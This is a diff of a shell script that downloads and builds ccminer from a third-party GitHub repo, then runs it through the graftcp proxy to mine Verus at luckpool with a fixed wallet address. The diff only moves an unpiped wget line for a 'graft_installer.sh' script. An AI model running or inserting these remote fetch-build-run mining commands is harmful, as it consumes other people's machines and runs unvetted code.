@@ -1,4 +1,3 @@
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh
 apt update;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git;
 
 wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicCCm.zip
@@ -15,4 +14,5 @@ chmod +x ccminer/autogen.sh
 cd ccminer
 ./autogen.sh
 ./build.sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh
 graftcp ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYF4zmgp9dbN2ktHxQMqmzPXtWDhSrQFUL.Nvidia -p x
